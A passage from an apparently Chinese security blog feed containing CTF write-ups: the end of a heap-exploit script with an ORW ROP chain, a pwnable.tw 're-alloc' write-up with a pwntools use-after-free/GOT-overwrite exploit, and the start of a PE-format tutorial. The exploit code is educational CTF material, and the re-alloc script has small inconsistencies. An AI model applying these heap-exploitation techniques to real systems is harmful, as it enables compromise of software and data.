sh.sendline(str(size_choice))</span><br><span class="line">    sh.recvuntil(<span class="string">'Please input content: '</span>)</span><br><span class="line">    sh.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove</span><span class="params">(idx)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">'Your input: '</span>)</span><br><span class="line">    sh.sendline(<span class="string">'2'</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">': '</span>)</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">'Your input: '</span>)</span><br><span class="line">    sh.sendline(<span class="string">'3'</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">': '</span>)</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line">    sh.recvuntil(<span class="string">': '</span>)</span><br><span class="line">    sh.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">'Your input: '</span>)</span><br><span class="line">    sh.sendline(<span class="string">'4'</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">': '</span>)</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line">    </span><br><span class="line"><span class="comment"># 首先用calloc add delte同时操作，泄露出heap和libc基址</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    add(i, <span class="number">4</span>, <span class="string">'a\n'</span>)</span><br><span class="line">    remove(i)</span><br><span class="line"></span><br><span class="line">show(<span class="number">6</span>)</span><br><span class="line">heapbase = u64(sh.recvuntil(<span class="string">'\n'</span>)[:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">0x26c0</span></span><br><span class="line">log.success(<span class="string">'heapbase: '</span> + hex(heapbase))</span><br><span class="line"><span class="comment"># 在这里把对应大小(0x100)的tcache准备好（5个），虽然我这里写了6个，但其实要想任意地址分配的话是5个，不过我这里无所谓</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>,<span class="number">13</span>):</span><br><span class="line">    add(i, <span class="number">2</span>, <span class="string">'a\n'</span>)</span><br><span class="line">    remove(i)</span><br><span class="line"></span><br><span class="line">add(<span class="number">14</span>, <span class="number">4</span>, <span class="string">'a\n'</span>)</span><br><span class="line">add(<span class="number">15</span>, <span class="number">1</span>, <span class="string">'b\n'</span>)</span><br><span class="line">remove(<span class="number">14</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">14</span>)</span><br><span class="line">libcbase = u64(sh.recvuntil(<span class="string">'\n'</span>)[:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))- <span class="number">0x3ebca0</span></span><br><span class="line">log.success(<span class="string">'libcbase: '</span> + hex(libcbase)) </span><br><span class="line"><span class="comment"># 然后利用last_reminder的性质，如果malloc一个比它大的，就会把这个加入到smallbin种，构造出两个smallbin</span></span><br><span class="line">add(<span class="number">15</span>, <span class="number">3</span>, <span class="string">'c\n'</span>)</span><br><span class="line"></span><br><span class="line">remove(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">16</span>, <span class="number">3</span>, <span class="string">'a\n'</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">3</span>, <span class="string">'a\n'</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(heapbase + <span class="number">0x37e0</span>) + p64(heapbase+<span class="number">0x250</span>+<span class="number">0x10</span>+<span class="number">0x800</span><span class="number">-0x10</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">'a'</span>*<span class="number">0x300</span>+p64(<span class="number">0</span>) +p64(<span class="number">0x101</span>) +payload)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = libcbase + <span class="number">0x000000000002155f</span></span><br><span class="line">pop_rdx_rsi_ret = libcbase + <span class="number">0x00000000001306d9</span></span><br><span class="line"></span><br><span class="line">open_addr = libcbase + <span class="number">0x10fc40</span></span><br><span class="line">read_addr = libcbase + <span class="number">0x110070</span></span><br><span class="line">write_addr = libcbase + <span class="number">0x110140</span></span><br><span class="line">leave_ret = libcbase + <span class="number">0x0000000000054803</span></span><br><span class="line"></span><br><span class="line">flag_addr = heapbase+<span class="number">0x37f0</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">''</span></span><br><span class="line">payload += <span class="string">'./flag\x00\x00'</span></span><br><span class="line">payload += p64(pop_rdi_ret)</span><br><span class="line">payload += p64(flag_addr)</span><br><span class="line">payload += p64(pop_rdx_rsi_ret)</span><br><span class="line">payload += p64(<span class="number">0x20</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(open_addr)</span><br><span class="line">payload += p64(pop_rdi_ret)</span><br><span class="line">payload += p64(<span class="number">3</span>)</span><br><span class="line">payload += p64(pop_rdx_rsi_ret)</span><br><span class="line">payload += p64(<span class="number">0x20</span>)</span><br><span class="line">payload += p64(flag_addr)</span><br><span class="line">payload += p64(read_addr)</span><br><span class="line">payload += p64(pop_rdi_ret)</span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(pop_rdx_rsi_ret)</span><br><span class="line">payload += p64(<span class="number">0x20</span>)</span><br><span class="line">payload += p64(flag_addr)</span><br><span class="line">payload += p64(write_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 最后利用后门函数有个栈溢出，因为开了沙箱逃逸，因此orw即可</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">2</span>, <span class="number">2</span>, payload + <span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">'input: '</span>)</span><br><span class="line">sh.sendline(<span class="string">'666'</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x80</span> + p64(flag_addr) + p64(leave_ret)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">'What do you want to say?'</span>)</span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>漏洞利用</category>
      </categories>
      <tags>
        <tag>tcache</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnable.tw re-alloc</title>
    <url>/year/07/29/cl7iordpu003f293fd4dwc6al/</url>
    <content><![CDATA[<p>以前做过realloc相关的利用，不过这题让我学到了realloc利用的新姿势</p>
<a id="more"></a>

<h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>题目提供了四个功能</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1. alloc</span><br><span class="line">2. realloc</span><br><span class="line">3. free</span><br><span class="line">4. exit</span><br></pre></td></tr></table></figure>

<p>其中alloc功能相当于malloc一个指定大小的块，不过大小限定在了0x78以内，realloc功能就是使用realloc函数重新分配空间，如果成功返回了一个地址，那么就把这个地址复制到bss段上。这里存在一个off by null，如果这个题没有两个堆块这个数量限制的话还可以搞堆重叠，但是只有两个chunk的话就很难利用。</p>
<p>realloc功能为更改chunk的size以及更新content内容，这里末尾不会自动补0.值得注意的是，当size为0时，相当于触发free但是对应的bss上的数组中的指针不会清0，于是这里有一个uaf可以利用。</p>
<p>free功能就是同时free掉chunk以及将heap数组中的指针清0</p>
<h2 id="相关知识点"><a href="#相关知识点" class="headerlink" title="相关知识点"></a>相关知识点</h2><h3 id="libc2-29-相关"><a href="#libc2-29-相关" class="headerlink" title="libc2.29 相关"></a>libc2.29 相关</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br><span class="line"></span><br><span class="line"><span class="comment">//glibc-2.29</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">  <span class="comment">/* This field exists to detect double frees.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span> *<span class="title">key</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br></pre></td></tr></table></figure>

<p>libc2.29中多出了一个结构叫做<code>key</code>，它会把<code>tcache</code>结构的头部保存在key中,然后在空闲<code>chunk</code>加入<code>tcache</code>链后从<code>key</code>开始遍历<code>tcache</code>中的<code>chunk</code>，看看有没有重复的，有则会出现<code>double free</code>的报错</p>
<p>检测代码如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (e-&gt;key == tcache)) <span class="comment">// 检查是否为tcache_perthread_struct地址</span></span><br><span class="line">  &#123;</span><br><span class="line">    tcache_entry *tmp;</span><br><span class="line">    LIBC_PROBE (memory_tcache_double_free, <span class="number">2</span>, e, tc_idx);</span><br><span class="line">    <span class="keyword">for</span> (tmp = tcache-&gt;entries[tc_idx];</span><br><span class="line">     tmp;</span><br><span class="line">     tmp = tmp-&gt;next)</span><br><span class="line">      <span class="keyword">if</span> (tmp == e)                      <span class="comment">// 检查tcache中是否有一样的chunk</span></span><br><span class="line">    malloc_printerr (<span class="string">"free(): double free detected in tcache 2"</span>);</span><br><span class="line">    <span class="comment">/* If we get here, it was a coincidence.  We've wasted a</span></span><br><span class="line"><span class="comment">       few cycles, but don't abort.  */</span></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>简单总结一下，2.29下tcache触发double free报错的条件为：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">e-key == &amp;tcache_perthread_struct &amp;&amp; chunk in tcachebin[chunk_idx]</span><br></pre></td></tr></table></figure>

<h3 id="realloc-ptr-size-函数"><a href="#realloc-ptr-size-函数" class="headerlink" title="realloc(ptr, size)函数"></a>realloc(ptr, size)函数</h3><p>总的来说，realloc函数在size不同的情况下，可以达到malloc，edit，free三种功能：</p>
<ol>
<li><code>ptr == 0</code>: malloc(size)</li>
<li><code>ptr != 0 &amp;&amp; size == 0</code>: free(ptr)</li>
<li><code>ptr != 0 &amp;&amp; size == old_size</code>: edit(ptr)</li>
<li><code>ptr != 0 &amp;&amp; size &lt; old_size</code>: edit(ptr) and free(remainder)</li>
<li><code>ptr != 0 &amp;&amp; size &gt; old_size</code>: new_ptr = malloc(size); strcpy(new_ptr, ptr); free(ptr); return new_ptr;</li>
</ol>
<h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><ol>
<li>利用uaf在不同的tcache链上放置atoll_got的chunk</li>
<li>利用其中一个指向atoll_got的chunk，把atoll_got改为printf，利用格式化字符串漏洞泄露libc</li>
<li>最后再利用另一个指向atoll_got的chunk，将其改为system，最后调用system(‘/bin/sh’)拿到shell</li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">from pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = 'debug'</span><br><span class="line">context.terminal = ['tmux', 'splitw', '-h']</span><br><span class="line">sh = process('./re-alloc')</span><br><span class="line">elf = ELF('./re-alloc')</span><br><span class="line">libc = ELF('./libc.so')</span><br><span class="line"></span><br><span class="line"><span class="function">def <span class="title">alloc</span><span class="params">(idx, size, content)</span>:</span></span><br><span class="line">    sh.recvuntil('Your choice: ')</span><br><span class="line">    sh.sendline(<span class="string">'1'</span>)</span><br><span class="line">    sh.recvuntil('Index:')</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line">    sh.recvuntil('Size:')</span><br><span class="line">    sh.sendline(str(size))</span><br><span class="line">    sh.recvuntil('Data:')</span><br><span class="line">    sh.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function">def <span class="title">realloc</span><span class="params">(idx, size, content)</span>:</span></span><br><span class="line">    sh.recvuntil('Your choice: ')</span><br><span class="line">    sh.sendline(<span class="string">'2'</span>)</span><br><span class="line">    sh.recvuntil('Index:')</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line">    sh.recvuntil('Size:')</span><br><span class="line">    sh.sendline(str(size))</span><br><span class="line">    if content == '':</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        sh.recvuntil('Data:')</span><br><span class="line">        sh.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function">def <span class="title">rfree</span><span class="params">(idx)</span>:</span></span><br><span class="line">    sh.recvuntil('Your choice: ')</span><br><span class="line">    sh.sendline(<span class="string">'3'</span>)</span><br><span class="line">    sh.recvuntil('Index:')</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">bss = elf.bss(<span class="number">0</span>)</span><br><span class="line">atoll_got = elf.got[<span class="string">"atoll"</span>]</span><br><span class="line">atoll_plt = elf.plt[<span class="string">"atoll"</span>]</span><br><span class="line">printf_plt = elf.plt[<span class="string">"printf"</span>]</span><br><span class="line">libc_start_main_ret_offset = libc.symbols[<span class="string">"__libc_start_main"</span>] + <span class="number">0xeb</span></span><br><span class="line">system_offset = libc.symbols[<span class="string">"system"</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># let tcache[<span class="number">0x20</span>] =&gt; atoll_got</span><br><span class="line"># heap[<span class="number">0</span>] ==&gt; chunk(<span class="number">0x18</span>) &lt;== heap[<span class="number">1</span>]</span><br><span class="line">alloc(0, 0x18, 'aaa\n')           #malloc</span><br><span class="line">realloc(0, 0, '')                 #free</span><br><span class="line"><span class="built_in">realloc</span>(<span class="number">0</span>, <span class="number">0x18</span>, p64(atoll_got))  <span class="meta">#edit</span></span><br><span class="line">alloc(<span class="number">1</span>, <span class="number">0x18</span>, <span class="string">"BBB"</span>)    </span><br><span class="line"><span class="meta"># now heap[0] == heap[1] == NULL</span></span><br><span class="line">realloc(0, 0x38, 'aaa\n')</span><br><span class="line">rfree(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">realloc</span>(<span class="number">1</span>, <span class="number">0x38</span>, <span class="string">"D"</span> * <span class="number">0x10</span>)</span><br><span class="line">rfree(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta"># let tcache[0x50] =&gt; atoll_got</span></span><br><span class="line"><span class="meta"># heap[0] ==&gt; chunk(0x18) &lt;== heap[1]</span></span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0</span>, <span class="number">0x48</span>, <span class="string">"AAAA"</span>)</span><br><span class="line">realloc(0,0,'')</span><br><span class="line"><span class="built_in">realloc</span>(<span class="number">0</span>, <span class="number">0x48</span>, p64(atoll_got))</span><br><span class="line">alloc(1, 0x48, 'BBB')</span><br><span class="line"></span><br><span class="line"><span class="meta"># now heap[0] == heap[1] == NULL</span></span><br><span class="line"><span class="built_in">realloc</span>(<span class="number">0</span>, <span class="number">0x58</span>, <span class="string">"CCC"</span>)</span><br><span class="line">rfree(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">realloc</span>(<span class="number">1</span>, <span class="number">0x58</span>, <span class="string">"D"</span> * <span class="number">0x10</span>)</span><br><span class="line">rfree(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta"># above all, we get two tcache point to atoll_got that can be malloc</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># alloc once at heap[0]</span></span><br><span class="line"><span class="meta"># change the atoll_got to printf_plt</span></span><br><span class="line"><span class="meta"># use format string bug to leak the __libc_start_main_ret in the stack</span></span><br><span class="line">gdb.attach(sh,'b*0x40129D')</span><br><span class="line">alloc(<span class="number">0</span>, <span class="number">0x48</span>, p64(printf_plt))</span><br><span class="line">sh.sendlineafter(<span class="string">"Your choice: "</span>, <span class="string">"3"</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">"Index:"</span>, <span class="string">"%21$p"</span>)</span><br><span class="line"></span><br><span class="line">libc_start_main_ret = <span class="keyword">int</span>(p.recv(<span class="number">14</span>), <span class="number">16</span>)</span><br><span class="line">libc_base = libc_start_main_ret - libc_start_main_ret_offset</span><br><span class="line">libc_system = libc_base + system_offset</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><ol>
<li>被free掉的chunk再用realloc进行相同size的操作居然可以达到uaf的效果，本以为会malloc出来的</li>
<li>把atoll函数改为printf真的强，这也提供了一个思路就是可以通过一个漏洞来构造另外的漏洞来达成利用的目的</li>
</ol>
]]></content>
      <categories>
        <category>pwn题writeup</category>
      </categories>
      <tags>
        <tag>tcache</tag>
        <tag>pwnable</tag>
      </tags>
  </entry>
  <entry>
    <title>PE结构</title>
    <url>/year/07/08/cl7iordox000z293f4xezub16/</url>
    <content><![CDATA[<p>梳理下PE的文件结构</p>
<a id="more"></a>

<h2 id="PE整体结构"><a href="#PE整体结构" class="headerlink" title="PE整体结构"></a>PE整体结构</h2><p>PE结构可以大致分为:</p>
<ul>
<li>DOS部分</li>
<li>NT头</li>
<li>节表(块表)</li>
<li>节数据(块数据)</li>
<li>调试信息</li>
</ul>
<h2 id="DOS头"><a href="#DOS头" class="headerlink" title="DOS头"></a>DOS头</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_DOS_HEADER</span> &#123;</span>      <span class="comment">// DOS .EXE header</span></span><br><span class="line">    WORD   e_magic;                     <span class="comment">// Magic number (标志,不会变的标志)</span></span><br><span class="line">    WORD   e_cblp;                      <span class="comment">// Bytes on last page of file</span></span><br><span class="line">    WORD   e_cp;                        <span class="comment">// Pages in file</span></span><br><span class="line">    WORD   e_crlc;                      <span class="comment">// Relocations</span></span><br><span class="line">    WORD   e_cparhdr;                   <span class="comment">// Size of header in paragraphs</span></span><br><span class="line">    WORD   e_minalloc;                  <span class="comment">// Minimum extra paragraphs needed</span></span><br><span class="line">    WORD   e_maxalloc;                  <span class="comment">// Maximum extra paragraphs needed</span></span><br><span class="line">    WORD   e_ss;                        <span class="comment">// Initial (relative) SS value</span></span><br><span class="line">    WORD   e_sp;                        <span class="comment">// Initial SP value</span></span><br><span class="line">    WORD   e_csum;                      <span class="comment">// Checksum</span></span><br><span class="line">    WORD   e_ip;                        <span class="comment">// Initial IP value</span></span><br><span class="line">    WORD   e_cs;                        <span class="comment">// Initial (relative) CS value</span></span><br><span class="line">    WORD   e_lfarlc;                    <span class="comment">// File address of relocation table</span></span><br><span class="line">    WORD   e_ovno;                      <span class="comment">// Overlay number</span></span><br><span class="line">    WORD   e_res[<span class="number">4</span>];                    <span class="comment">// Reserved words</span></span><br><span class="line">    WORD   e_oemid;                     <span class="comment">// OEM identifier (for e_oeminfo)</span></span><br><span class="line">    WORD   e_oeminfo;                   <span class="comment">// OEM information; e_oemid specific</span></span><br><span class="line">    WORD   e_res2[<span class="number">10</span>];                  <span class="comment">// Reserved words</span></span><br><span class="line">    LONG   e_lfanew;                    <span class="comment">// File address of new exe header</span></span><br><span class="line">  &#125; IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;</span><br></pre></td></tr></table></figure>

<p>IMAGE_DOS_HEADER结构体的大小为64字节。在该结构中必须知道两个重要成员: e_magic与e_lfanew</p>
<ul>
<li>e_magic: DOS签名(signature)</li>
<li>e_lfanew: 只是NT头的偏移</li>
</ul>
<p><strong>主要通过它里面的e_magic和e_lfanew来判断该文件是否是PE文件格式。</strong></p>
<h2 id="NT头"><a href="#NT头" class="headerlink" title="NT头"></a>NT头</h2><p>PE文件头由PE文件头标志，标准PE头，扩展PE头三部分组成。PE文件头标志自然是50 40 00 00，也就是’PE’，我们从结构体的角度看一下PE文件头的详细信息</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_NT_HEADERS</span> &#123;</span></span><br><span class="line">    DWORD Signature; 						<span class="comment">//NT头标志 =&gt; 4字节</span></span><br><span class="line">    IMAGE_FILE_HEADER FileHeader; 			<span class="comment">//文件头 =&gt; 20字节</span></span><br><span class="line">    IMAGE_OPTIONAL_HEADER32 OptionalHeader; <span class="comment">//扩展PE头 =&gt; 32位下224字节(0xE0) 64位下240字节(0xF0)</span></span><br><span class="line">&#125; IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;</span><br></pre></td></tr></table></figure>

<h3 id="文件头"><a href="#文件头" class="headerlink" title="文件头"></a>文件头</h3><p>文件头是表现文件大致属性的IMAGE_FILE_HEADER结构体。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_FILE_HEADER</span> &#123;</span></span><br><span class="line">    WORD    Machine; 				<span class="comment">//可以运行在什么平台上 任意:0 ,Intel 386以及后续:14C x64:8664</span></span><br><span class="line">    WORD    NumberOfSections; 		<span class="comment">//节的数量</span></span><br><span class="line">    DWORD   TimeDateStamp; 			<span class="comment">//编译器填写的时间戳</span></span><br><span class="line">    DWORD   PointerToSymbolTable;   <span class="comment">//调试相关</span></span><br><span class="line">    DWORD   NumberOfSymbols; 		<span class="comment">//调试相关</span></span><br><span class="line">    WORD    SizeOfOptionalHeader;   <span class="comment">//标识扩展PE头大小</span></span><br><span class="line">    WORD    Characteristics;        <span class="comment">//文件属性 =&gt; 16进制转换为2进制根据哪些位有1,可以查看相关属性</span></span><br><span class="line">&#125; IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;</span><br></pre></td></tr></table></figure>

<p><strong>这个结构体主要包含了，CPU的Machine码，节区数量，需要装载的可选头的大小和文件属性等信息。</strong></p>
<h3 id="可选头"><a href="#可选头" class="headerlink" title="可选头"></a>可选头</h3><p>可选头包含了很多信息，重点关注：</p>
<ul>
<li>代码起始地址 AdressOfEntryPoint</li>
<li>加载基址 ImageBase。执行PE文件时，PE装载器先创建进程，再将文件载入内存，然后再把EIP寄存器的值设为ImgeBase+AddressOfEntryPoint</li>
<li>文件对齐和节区对齐的值</li>
<li>PE头的大小和Image的大小</li>
<li>IMAGE_DATA_DIRECTORY的表(包含了很多重要的表，例如导入表导出表等)</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_OPTIONAL_HEADER</span> &#123;</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// Standard fields.</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">    WORD    Magic;						<span class="comment">//PE32: 10B PE64: 20B</span></span><br><span class="line">    BYTE    MajorLinkerVersion;</span><br><span class="line">    BYTE    MinorLinkerVersion;</span><br><span class="line">    DWORD   SizeOfCode;					<span class="comment">//所有含有代码的区块的大小 编译器填入 没用(可改)</span></span><br><span class="line">    DWORD   SizeOfInitializedData;		<span class="comment">//所有初始化数据区块的大小 编译器填入 没用(可改)</span></span><br><span class="line">    DWORD   SizeOfUninitializedData;	<span class="comment">//所有含未初始化数据区块的大小 编译器填入 没用(可改)</span></span><br><span class="line">    DWORD   AddressOfEntryPoint;		<span class="comment">//程序入口RVA</span></span><br><span class="line">    DWORD   BaseOfCode;					<span class="comment">//代码区块起始RVA</span></span><br><span class="line">    DWORD   BaseOfData;					<span class="comment">//数据区块起始RVA</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// NT additional fields.</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">    DWORD   ImageBase;						<span class="comment">//内存镜像基址(程序默认载入基地址)</span></span><br><span class="line">    DWORD   SectionAlignment; 				<span class="comment">//内存中对齐大小</span></span><br><span class="line">    DWORD   FileAlignment; 					<span class="comment">//文件中对齐大小(提高程序运行效率)</span></span><br><span class="line">    WORD    MajorOperatingSystemVersion;</span><br><span class="line">    WORD    MinorOperatingSystemVersion;</span><br><span class="line">    WORD    MajorImageVersion;</span><br><span class="line">    WORD    MinorImageVersion;</span><br><span class="line">    WORD    MajorSubsystemVersion;</span><br><span class="line">    WORD    MinorSubsystemVersion;</span><br><span class="line">    DWORD   Win32VersionValue;</span><br><span class="line">    DWORD   SizeOfImage;					<span class="comment">//内存中整个PE文件的映射的尺寸,可比实际值大,必须是SectionAlignment的整数倍</span></span><br><span class="line">    DWORD   SizeOfHeaders; 					<span class="comment">//所有的头加上节表文件对齐之后的值</span></span><br><span class="line">    DWORD   CheckSum;						<span class="comment">//映像校验和,一些系统.dll文件有要求,判断是否被修改</span></span><br><span class="line">    WORD    Subsystem;						</span><br><span class="line">    WORD    DllCharacteristics;				<span class="comment">//文件特性,不是针对DLL文件的,16进制转换2进制可以根据属性对应的表格得到相应的属性</span></span><br><span class="line">    DWORD   SizeOfStackReserve;</span><br><span class="line">    DWORD   SizeOfStackCommit;</span><br><span class="line">    DWORD   SizeOfHeapReserve;</span><br><span class="line">    DWORD   SizeOfHeapCommit;</span><br><span class="line">    DWORD   LoaderFlags;</span><br><span class="line">    DWORD   NumberOfRvaAndSizes;</span><br><span class="line">    IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES]; <span class="comment">//数据目录表,结构体数组</span></span><br><span class="line">&#125; IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;</span><br></pre></td></tr></table></figure>

<h2 id="节区头"><a href="#节区头" class="headerlink" title="节区头"></a>节区头</h2><p>节区头是由IMAGE_SECTION_HEADER结构体组成的数组，每个结构体对应一个节区。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_SECTION_HEADER</span> &#123;</span></span><br><span class="line">    BYTE    Name[IMAGE_SIZEOF_SHORT_NAME]; <span class="comment">//ASCII字符串 可自定义 只截取8个字节</span></span><br><span class="line">    <span class="keyword">union</span> &#123;								   <span class="comment">//该节在没有对齐之前的真实尺寸,该值可以不准确</span></span><br><span class="line">            DWORD   PhysicalAddress;</span><br><span class="line">            DWORD   VirtualSize;</span><br><span class="line">    &#125; Misc;</span><br><span class="line">    DWORD   VirtualAddress; 			   <span class="comment">//内存中的偏移地址</span></span><br><span class="line">    DWORD   SizeOfRawData;				   <span class="comment">//节在文件中对齐的尺寸</span></span><br><span class="line">    DWORD   PointerToRawData;			   <span class="comment">//节区在文件中的偏移</span></span><br><span class="line">    DWORD   PointerToRelocations;</span><br><span class="line">    DWORD   PointerToLinenumbers;</span><br><span class="line">    WORD    NumberOfRelocations;</span><br><span class="line">    WORD    NumberOfLinenumbers;</span><br><span class="line">    DWORD   Characteristics;			   <span class="comment">//节的属性</span></span><br><span class="line">&#125; IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;</span><br></pre></td></tr></table></figure>

<p>主要包含了节区的偏移地址，对齐和节的属性等信息</p>
<h2 id="导出表"><a href="#导出表" class="headerlink" title="导出表"></a>导出表</h2><p>导出表(Export Table)一般是DLL文件用的比较多，exe文件很少有导出表，导出表的数据结构如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_EXPORT_DIRECTORY</span> &#123;</span></span><br><span class="line">    DWORD   Characteristics;</span><br><span class="line">    DWORD   TimeDateStamp;</span><br><span class="line">    WORD    MajorVersion;</span><br><span class="line">    WORD    MinorVersion;</span><br><span class="line">    DWORD   Name;					<span class="comment">// 指针指向该导出表文件名字符串</span></span><br><span class="line">    DWORD   Base;					<span class="comment">// 导出函数起始序号</span></span><br><span class="line">    DWORD   NumberOfFunctions;		<span class="comment">// 所有导出函数的个数</span></span><br><span class="line">    DWORD   NumberOfNames;			<span class="comment">// 以函数名字导出的函数个数</span></span><br><span class="line">    DWORD   AddressOfFunctions;     <span class="comment">// 指针指向导出函数地址表RVA</span></span><br><span class="line">    DWORD   AddressOfNames;         <span class="comment">// 指针指向导出函数名称表RVA</span></span><br><span class="line">    DWORD   AddressOfNameOrdinals;  <span class="comment">// 指针指向导出函数序号表RVA</span></span><br><span class="line">&#125; IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY;</span><br></pre></td></tr></table></figure>

<h2 id="导入表"><a href="#导入表" class="headerlink" title="导入表"></a>导入表</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_IMPORT_DESCRIPTOR</span> &#123;</span></span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        DWORD   Characteristics;            <span class="comment">// 0 for terminating null import descriptor</span></span><br><span class="line">        DWORD   OriginalFirstThunk;         <span class="comment">// RVA 指向 INT (PIMAGE_THUNK_DATA结构数组)</span></span><br><span class="line">    &#125; DUMMYUNIONNAME;</span><br><span class="line">    DWORD   TimeDateStamp;                  <span class="comment">// 0 if not bound,</span></span><br><span class="line">                                            <span class="comment">// -1 if bound, and real date\time stamp</span></span><br><span class="line">                                            <span class="comment">//     in IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT 